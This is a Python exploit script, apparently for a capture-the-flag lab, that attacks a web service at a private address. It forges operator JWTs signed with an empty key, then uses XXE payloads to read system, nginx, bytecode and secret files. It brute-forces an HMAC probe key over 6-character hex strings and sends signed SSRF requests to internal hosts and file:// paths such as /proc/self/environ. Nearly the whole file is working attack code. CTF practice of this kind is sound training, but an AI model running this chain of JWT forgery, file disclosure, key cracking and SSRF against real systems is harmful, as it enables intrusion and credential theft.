#!/usr/bin/env python3
"""round36 — Continue hunting PROBE_SECRET: hosts file, nginx, pycache, more volumes"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:300]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# ============================================================
print("="*70)
print("PHASE 1: /etc/hosts — INTERNAL DNS MAPPING")
print("="*70)

st, val = xxe_read("/etc/hosts")
if st == "OK" and val:
    print(val)
elif st == "BIN":
    print("  [EXISTS/BINARY]")
else:
    print(f"  [{st}] {val}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: /etc/resolv.conf — DNS CONFIG")
print("="*70)

st, val = xxe_read("/etc/resolv.conf")
if st == "OK" and val:
    print(val)

# ============================================================
print("\n"+"="*70)
print("PHASE 3: NGINX CONFIG")
print("="*70)

nginx_paths = [
    "/etc/nginx/nginx.conf",
    "/etc/nginx/conf.d/default.conf",
    "/etc/nginx/conf.d/app.conf",
    "/etc/nginx/sites-enabled/default",
    "/etc/nginx/sites-available/default",
]
for fp in nginx_paths:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"\n  {fp}:")
        print(val[:1000])
    elif st == "BIN":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: PYTHON __pycache__ BYTECODE")
print("="*70)

pycache_paths = [
    "/app/__pycache__/app.cpython-311.pyc",
    "/app/__pycache__/auth.cpython-311.pyc",
    "/app/__pycache__/db.cpython-311.pyc",
    "/app/__pycache__/app.cpython-310.pyc",
    "/app/__pycache__/auth.cpython-310.pyc",
    "/app/__pycache__/app.cpython-312.pyc",
    "/app/__pycache__/auth.cpython-312.pyc",
]
for fp in pycache_paths:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"  [READABLE!] {fp}: {val[:200]}")
    elif st == "BIN":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: READ flag (no .txt) FILES")
print("="*70)

for fp in ["/var/local/xxe/flag", "/var/local/lfi/flag"]:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"  >>> {fp}: '{val}' <<<")
    elif st == "BIN":
        print(f"  [EXISTS/BINARY] {fp}")
    else:
        print(f"  [{st}] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 6: DEEP VOLUME EXPLORATION")
print("="*70)

# Try reading more files from the flag volumes
more_files = [
    "/var/local/xxe/secret", "/var/local/xxe/probe_secret",
    "/var/local/xxe/config", "/var/local/xxe/env",
    "/var/local/xxe/README", "/var/local/xxe/readme.txt",
    "/var/local/xxe/hint", "/var/local/xxe/hint.txt",
    "/var/local/xxe/note", "/var/local/xxe/note.txt",
    "/var/local/lfi/secret", "/var/local/lfi/probe_secret",
    "/var/local/lfi/config", "/var/local/lfi/env",
    "/var/local/lfi/README", "/var/local/lfi/readme.txt",
    "/var/local/lfi/hint", "/var/local/lfi/hint.txt",
    # App-level secrets
    "/app/secret_key", "/app/SECRET_KEY",
    "/app/flask_secret", "/app/FLASK_SECRET",
    "/app/probe.secret", "/app/.probe_secret",
    "/app/hmac.key", "/app/.hmac_key",
]
for fp in more_files:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"  [FOUND!] {fp}: '{val}'")
    elif st == "BIN":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 7: SUPERVISOR / ENTRYPOINT ALTERNATIVES")
print("="*70)

# Try to find startup scripts that might set PROBE_SECRET
startup_paths = [
    "/app/start.sh", "/app/run.sh", "/app/docker-entrypoint.sh",
    "/app/init.sh", "/app/boot.sh",
    "/docker-entrypoint.sh", "/entrypoint.sh",
    "/start.sh", "/run.sh",
    "/etc/supervisor/conf.d/app.conf",
    "/etc/supervisord.conf",
    "/app/Procfile", "/app/Dockerfile",
    # systemd / init
    "/etc/init.d/caspiterminal",
]
for fp in startup_paths:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"  [FOUND!] {fp}:")
        for line in val.split('\n')[:20]:
            print(f"    {line}")
    elif st == "BIN":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 8: TEST FLAG VALUES AS PROBE KEYS (all variants)")
print("="*70)

known_url = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

flag_vals = [
    "STF{c8142af02727b3d7d51e4aece866104b}",
    "KHS{c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95}",
    "c8142af02727b3d7d51e4aece866104b",
    "c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95",
]

for val in flag_vals:
    for suffix in ["", "\n"]:
        key = (val + suffix).encode()
        computed = hm.new(key, known_url, hashlib.sha256).digest()
        if computed == known_sig:
            print(f"  PROBE KEY MATCH: '{val}' <<<<<<")
            break

# Try the hex values as bytes
for hexval in ["c8142af02727b3d7d51e4aece866104b", "c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95"]:
    try:
        key = bytes.fromhex(hexval)
        computed = hm.new(key, known_url, hashlib.sha256).digest()
        if computed == known_sig:
            print(f"  PROBE KEY MATCH (hex bytes): '{hexval}' <<<<<<")
    except:
        pass

print("  No flag-based probe key match")

# ============================================================
print("\n"+"="*70)
print("PHASE 9: 6-BYTE TARGETED BRUTE-FORCE")
print("="*70)

# Try common 6-char words/patterns
import itertools

words_6 = [
    b"secret", b"probe1", b"probe2", b"gauges", b"gauge1",
    b"caspi1", b"caspi2", b"termin", b"signal",
    b"llehs1", b"llesl1", b"hakctf", b"kazctf",
    b"abc123", b"qwerty", b"pass12", b"admin1",
    b"12345a", b"123456", b"aaaaaa", b"000000",
]

print(f"  Testing {len(words_6)} common 6-char words...")
for key in words_6:
    computed = hm.new(key, known_url, hashlib.sha256).digest()
    if computed == known_sig:
        print(f"  PROBE KEY FOUND: {key!r} <<<<<<")
        break
else:
    print(f"  No match from common words")

# Also try 6-char hex strings (common for tokens/keys)
# Pattern: [0-9a-f]{6} = 16^6 = 16.7M — about 20 seconds
print("  Testing 6-char hex probe keys (16.7M)...")
t0 = time.time()
found = False
hexchars = b"0123456789abcdef"
checked = 0

for b0 in hexchars:
    for b1 in hexchars:
        p2 = bytes([b0, b1])
        for b2 in hexchars:
            p3 = p2 + bytes([b2])
            for b3 in hexchars:
                p4 = p3 + bytes([b3])
                for b4 in hexchars:
                    p5 = p4 + bytes([b4])
                    for b5 in hexchars:
                        key = p5 + bytes([b5])
                        if hm.new(key, known_url, hashlib.sha256).digest() == known_sig:
                            elapsed = time.time() - t0
                            print(f"\n  PROBE KEY FOUND: '{key.decode()}' in {elapsed:.1f}s <<<<<<")
                            found = True
                            break
                    if found: break
                if found: break
            if found: break
            checked += 256
        if found: break
        if checked % (256*16*4) == 0 and checked > 0:
            elapsed = time.time() - t0
            pct = checked * 256 / (16**6) * 100
            print(f"  Hex progress: {pct:.1f}% ({elapsed:.0f}s)", end="\r", flush=True)
    if found: break

if not found:
    elapsed = time.time() - t0
    print(f"\n  No 6-char hex probe key ({elapsed:.1f}s)")

# ============================================================
if found:
    print("\n"+"="*70)
    print("PHASE 10: SSRF WITH FOUND PROBE KEY")
    print("="*70)

    probe_key = key
    targets = [
        "http://gauge-gw.internal:9100/",
        "http://gauge-gw.internal:9100/v1/",
        "http://gauge-gw.internal:9100/v1/config",
        "http://gauge-gw.internal:9100/v1/secret",
        "http://gauge-gw.internal:9100/v1/flag",
        "http://gauge-gw.internal:9100/flag",
        "http://gauge-gw.internal:9100/secret",
        "http://gauge-gw.internal:9100/env",
        "http://gauge-gw.internal:9100/health",
        "http://gauge-gw.internal:9100/metrics",
        "http://127.0.0.1:3000/api/auth/me",
        "http://terminal-db:5432/",
        "file:///app/app.py",
        "file:///proc/self/environ",
        "file:///app/keys/carrier",
        "file:///app/entrypoint.sh",
    ]

    for url in targets:
        sig = hm.new(probe_key, url.encode(), hashlib.sha256).hexdigest()
        try:
            r = S.post(f"{CASPI}/api/ops/probe",
                json={"url": url, "sig": sig},
                headers=AUTH_OP, timeout=10)
            if r.status_code == 200:
                try:
                    d = r.json()
                    print(f"  [{d.get('status','')}] {url}")
                    body = d.get("body","")[:500]
                    if body:
                        print(f"    {body[:300]}")
                except:
                    print(f"  [200] {url}: {r.text[:200]}")
            else:
                print(f"  [{r.status_code}] {url}: {r.text[:80]}")
        except Exception as e:
            print(f"  [ERR] {url}: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
